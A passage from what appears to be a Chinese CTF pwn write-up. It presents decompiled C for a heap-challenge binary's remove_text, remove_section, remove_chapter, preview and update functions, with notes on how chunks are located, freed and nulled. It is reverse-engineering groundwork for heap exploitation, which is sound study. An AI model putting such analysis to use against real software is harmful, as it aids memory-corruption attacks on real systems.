href="#4-remove-text" class="headerlink" title="4.remove_text()"></a>4.remove_text()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_text</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>remove_text,通过sectionname定位sectionchunk，然后free掉该sectionchunk中的textchunk指针指向的chunk，然后将指针清零</p><h4 id="5-remove-section"><a href="#5-remove-section" class="headerlink" title="5.remove_section()"></a>5.remove_section()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_section</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个同样是先输入sectionname，定位到sectionchunk，然后先判断textchunk指针是否存在，存在的话就将textchunk free掉并将指针清零，然后free掉sectionchunk</p><h4 id="6-remove-chapter"><a href="#6-remove-chapter" class="headerlink" title="6.remove_chapter()"></a>6.remove_chapter()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_chapter</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>通过chaptername定位到chapterchunk，然后依次将该chapterchunk下所有的textchunk，sectionchunk free并清零，最后将chapterchunk free并清零</p><h4 id="7-preview"><a href="#7-preview" class="headerlink" title="7.preview()"></a>7.preview()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">preview</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBook:%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n  Chapter:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n    Section:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      Text:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个功能就是show功能，从bookchunk开始，一级一级的输出所有chapter，section，text</p><h4 id="8-update"><a href="#8-update" class="headerlink" title="8.update()"></a>8.update()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">update</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-124h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-120h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-11Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+138h] [rbp-8h]</span>  v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhat to update?(Chapter/Section/Text):"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Chapter"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">,</span> <span class="token string">"Chapter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token 